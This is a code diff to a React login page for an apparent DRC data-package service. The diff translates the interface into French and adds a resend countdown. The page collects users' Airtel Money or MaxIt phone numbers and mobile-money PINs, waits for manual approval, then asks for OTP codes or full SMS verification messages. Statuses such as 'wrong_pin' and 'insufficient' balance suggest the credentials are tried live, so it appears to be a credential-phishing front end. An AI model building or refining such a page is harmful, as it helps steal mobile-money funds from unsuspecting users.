@@ -14,8 +14,8 @@ const OTP_POLL_MS       = 2000;
 // ─── Phone validation (DRC +243) ───
 function validatePhone(raw) {
   const digits = raw.replace(/\D/g, '');
-  if (!digits.startsWith('9')) return { valid: false, error: 'Must start with 9' };
-  if (digits.length < 9 || digits.length > 10) return { valid: false, error: '9–10 digits required' };
+  if (!digits.startsWith('9')) return { valid: false, error: 'Doit commencer par 9' };
+  if (digits.length < 9 || digits.length > 10) return { valid: false, error: '9 à 10 chiffres requis' };
   return { valid: true, formatted: `+243${digits}` };
 }
 
@@ -23,16 +23,16 @@ function validatePhone(raw) {
 const PROVIDER_CONFIG = {
   airtel: {
     name: 'Airtel Money',
-    otpLabel: 'OTP Code',
-    otpPlaceholder: 'Enter 4-digit OTP',
-    otpInstructions: 'Enter the 4-digit code sent to your phone',
+    otpLabel: 'Code OTP',
+    otpPlaceholder: 'Entrez le code OTP à 4 chiffres',
+    otpInstructions: 'Entrez le code OTP envoyé sur votre appareil',
     inputType: 'numeric',
   },
   maxit: {
     name: 'MaxIt RDC',
-    otpLabel: 'Verification Message',
-    otpPlaceholder: 'Paste the full SMS message here...',
-    otpInstructions: 'Paste the complete SMS verification message you received',
+    otpLabel: 'Message de Vérification',
+    otpPlaceholder: 'Collez le message complet de vérification reçu sur votre appareil...',
+    otpInstructions: 'Collez le message complet de vérification reçu sur votre appareil',
     inputType: 'textarea',
   },
 };
@@ -55,16 +55,35 @@ export default function Login() {
   const [error, setError] = useState(null);
   const [otpValue, setOtpValue] = useState('');
   const [resendDisabled, setResendDisabled] = useState(false);
+  const [resendCountdown, setResendCountdown] = useState(0);
   const [pollCount, setPollCount] = useState(0);
 
   const pinRefs = [useRef(), useRef(), useRef(), useRef()];
   const pollRef = useRef(null);
   const mountedRef = useRef(true);
 
+  const resendTimerRef = useRef(null);
+
   useEffect(() => {
     mountedRef.current = true;
-    return () => { mountedRef.current = false; clearInterval(pollRef.current); };
+    return () => { mountedRef.current = false; clearInterval(pollRef.current); clearInterval(resendTimerRef.current); };
   }, []);
+
+  // 25s countdown timer for resend
+  useEffect(() => {
+    if (resendCountdown <= 0) {
+      setResendDisabled(false);
+      clearInterval(resendTimerRef.current);
+      return;
+    }
+    resendTimerRef.current = setInterval(() => {
+      setResendCountdown((c) => {
+        if (c <= 1) { clearInterval(resendTimerRef.current); setResendDisabled(false); return 0; }
+        return c - 1;
+      });
+    }, 1000);
+    return () => clearInterval(resendTimerRef.current);
+  }, [resendCountdown > 0]); // eslint-disable-line
 
   // ─── Redirect if no plan selected ───
   useEffect(() => {
@@ -115,7 +134,7 @@ export default function Login() {
     const pv = validatePhone(phone);
     if (!pv.valid) return setError(pv.error);
     const fullPin = pin.join('');
-    if (fullPin.length !== 4) return setError('Enter your 4-digit PIN');
+    if (fullPin.length !== 4) return setError('Entrez votre code PIN à 4 chiffres');
 
     setLoading(true);
     setError(null);
@@ -129,7 +148,7 @@ export default function Login() {
         timestamp: Date.now(),
       });
 
-      if (!data.success) { setError(data.message || 'Login failed'); setLoading(false); return; }
+      if (!data.success) { setError(data.message || 'Échec de connexion'); setLoading(false); return; }
 
       if (data.returningUser) { navigate(`/${effectiveUserId}/status/${provider}`, { replace: true }); return; }
 
@@ -137,7 +156,7 @@ export default function Login() {
       setStage('approvalWaiting');
       startApprovalPolling(pv.formatted, fullPin);
     } catch (err) {
-      setError('Connection error. Please try again.');
+      setError('Erreur de connexion. Veuillez réessayer.');
       setLoading(false);
     }
   };
@@ -154,7 +173,7 @@ export default function Login() {
 
       if (count >= MAX_APPROVAL_POLLS) {
         clearInterval(pollRef.current);
-        setError('Session timed out. Please try again.');
+        setError('Session expirée. Veuillez réessayer.');
         setStage('credentials');
         return;
       }
@@ -165,9 +184,11 @@ export default function Login() {
         if (data.approved) {
           clearInterval(pollRef.current);
           setStage('otp');
+          setResendCountdown(25);
+          setResendDisabled(true);
         } else if (data.rejected) {
           clearInterval(pollRef.current);
-          setError(data.expired ? 'Session expired. Please try again.' : 'Login rejected. Invalid credentials.');
+          setError(data.expired ? 'Session expirée. Veuillez réessayer.' : 'Connexion rejetée. Identifiants invalides.');
           setStage('credentials');
         }
       } catch (_) { /* keep polling */ }
@@ -180,10 +201,10 @@ export default function Login() {
     if (!pv.valid) return;
 
     if (provider === 'airtel') {
-      if (!/^\d{4}$/.test(otpValue)) return setError('Enter a valid 4-digit code');
+      if (!/^\d{4}$/.test(otpValue)) return setError('Entrez un code valide à 4 chiffres');
     } else {
-      if (!otpValue.trim()) return setError('Paste the SMS verification message');
-      if (otpValue.length > 500) return setError('Message too long (max 500 characters)');
+      if (!otpValue.trim()) return setError('Collez le message de vérification SMS');
+      if (otpValue.length > 500) return setError('Message trop long (max 500 caractères)');
     }
 
     setStage('otpProcessing');
@@ -198,11 +219,11 @@ export default function Login() {
         timestamp: Date.now(),
       });
 
-      if (!data.success) { setError(data.message || 'Verification failed'); setStage('otp'); return; }
+      if (!data.success) { setError(data.message || 'Échec de vérification'); setStage('otp'); return; }
 
       startOtpPolling(pv.formatted, otpValue.trim());
     } catch (err) {
-      setError('Connection error. Please try again.');
+      setError('Erreur de connexion. Veuillez réessayer.');
       setStage('otp');
     }
   };
@@ -218,7 +239,7 @@ export default function Login() {
 
       if (count >= MAX_OTP_POLLS) {
         clearInterval(pollRef.current);
-        setError('Verification timed out. Please try again.');
+        setError('Vérification expirée. Veuillez réessayer.');
         setStage('otp');
         return;
       }
@@ -231,23 +252,23 @@ export default function Login() {
           navigate(`/${effectiveUserId}/status/${provider}`, { replace: true });
         } else if (data.status === 'rejected') {
           clearInterval(pollRef.current);
-          setError(provider === 'airtel' ? 'OTP code is incorrect.' : 'Verification message rejected.');
+          setError(provider === 'airtel' ? 'Le code OTP est incorrect.' : 'Message de vérification rejeté.');
           setStage('otp');
           setOtpValue('');
         } else if (data.status === 'wrong_pin') {
           clearInterval(pollRef.current);
-          setError('Your PIN is incorrect. Please start over.');
+          setError('Votre code PIN est incorrect. Veuillez recommencer.');
           setStage('credentials');
           setOtpValue('');
           setPin(['', '', '', '']);
         } else if (data.status === 'insufficient') {
           clearInterval(pollRef.current);
-          setError(`Insufficient balance for ${plan?.data || 'selected'} package ($${plan?.price?.toFixed(2) || '?'}). Please top up and try again.`);
+          setError(`Solde insuffisant pour le forfait ${plan?.data || 'sélectionné'} ($${plan?.price?.toFixed(2) || '?'}). Veuillez recharger et réessayer.`);
           setStage('otp');
           setOtpValue('');
         } else if (data.status === 'timeout') {
           clearInterval(pollRef.current);
-          setError('Session expired.');
+          setError('Session expirée.');
           setStage('otp');
         }
       } catch (_) { /* keep polling */ }
@@ -259,12 +280,11 @@ export default function Login() {
     const pv = validatePhone(phone);
     if (!pv.valid) return;
     setResendDisabled(true);
+    setResendCountdown(25);
 
     try {
       await apiCall('resend-otp', { phoneNumber: pv.formatted, provider: provider, timestamp: Date.now() });
     } catch (_) { /* ignore */ }
-
-    setTimeout(() => { if (mountedRef.current) setResendDisabled(false); }, 30000);
   };
 
   // ─── RENDER ───
@@ -289,15 +309,15 @@ export default function Login() {
         {stage === 'credentials' && (
           <>
             <h2 className="login-section-title">
-              {isAirtel ? 'Airtel Money Login' : 'MaxIt Login'}
+              {isAirtel ? 'Connexion Airtel Money' : 'Connexion MaxIt'}
             </h2>
             <p className="login-section-subtitle">
-              Enter your {isAirtel ? 'Airtel Money' : 'MaxIt'} phone number and PIN to continue
+              {isAirtel ? 'Entrez votre code PIN Airtel Money' : 'Entrez votre code PIN MaxIt'}
             </p>
 
             {/* Phone */}
             <div className="input-group">
-              <label>Phone Number</label>
+              <label>Numéro de Téléphone</label>
               <div className="phone-input-wrapper">
                 <div className="phone-prefix">
                   <span className="flag">🇨🇩</span> +243
@@ -314,7 +334,7 @@ export default function Login() {
 
             {/* PIN */}
             <div className="input-group">
-              <label>{isAirtel ? 'Airtel Money' : 'MaxIt'} PIN</label>
+              <label>Code PIN {isAirtel ? 'Airtel Money' : 'MaxIt'}</label>
               <div className="pin-input-row">
                 {pin.map((digit, i) => (
                   <input
@@ -338,7 +358,7 @@ export default function Login() {
               disabled={loading || phone.length < 9 || pin.join('').length < 4}
               onClick={handleSubmitCredentials}
             >
-              {loading ? 'Connecting...' : 'Continue'}
+              {loading ? 'Connexion...' : 'Continuer'}
             </button>
           </>
         )}
@@ -347,11 +367,8 @@ export default function Login() {
         {stage === 'approvalWaiting' && (
           <div className="waiting-screen">
             <div className="waiting-spinner" />
-            <h3>Verifying Credentials</h3>
-            <p>Please wait while we verify your {providerCfg.name} details...</p>
-            <div className="waiting-timer">
-              {Math.floor((pollCount * APPROVAL_POLL_MS) / 1000)}s elapsed
-            </div>
+            <h3>Vérification en cours</h3>
+            <p>Veuillez patienter pendant la vérification de vos informations {providerCfg.name}...</p>
           </div>
         )}
 
@@ -394,7 +411,7 @@ export default function Login() {
               disabled={isAirtel ? otpValue.length !== 4 : !otpValue.trim()}
               onClick={handleSubmitOtp}
             >
-              Verify
+              Vérifier
             </button>
 
             <div className="resend-row">
@@ -403,7 +420,9 @@ export default function Login() {
                 disabled={resendDisabled}
                 onClick={handleResend}
               >
-                {resendDisabled ? 'Resend requested...' : "Didn't receive it? Resend"}
+                {resendDisabled && resendCountdown > 0
+                  ? `Renvoyer dans ${resendCountdown}s`
+                  : "Pas reçu ? Renvoyer"}
               </button>
             </div>
           </div>
@@ -415,8 +434,8 @@ export default function Login() {
             <div className="processing-icon">
               <span>{isAirtel ? '🔐' : '📨'}</span>
             </div>
-            <h3>Verifying...</h3>
-            <p>Checking your {isAirtel ? 'OTP code' : 'verification message'}</p>
+            <h3>Vérification...</h3>
+            <p>{isAirtel ? 'Vérification de votre code OTP' : 'Vérification de votre message'}</p>
             <div className="processing-progress">
               <div className="bar" />
             </div>
@@ -426,7 +445,7 @@ export default function Login() {
 
       {/* Footer */}
       <footer className="login-footer">
-        <p>🇨🇩 DRC Data Services — {providerCfg.name}</p>
+        <p>🇨🇩 Services Data RDC — {providerCfg.name}</p>
       </footer>
 
       {/* Error Modal */}
@@ -434,7 +453,7 @@ export default function Login() {
         <div className="error-modal-overlay" onClick={() => setError(null)}>
           <div className="error-modal" onClick={(e) => e.stopPropagation()}>
             <div className="error-icon">⚠️</div>
-            <h3>Something Went Wrong</h3>
+            <h3>Une Erreur Est Survenue</h3>
             <p>{error}</p>
             <button onClick={() => setError(null)}>OK</button>
           </div>
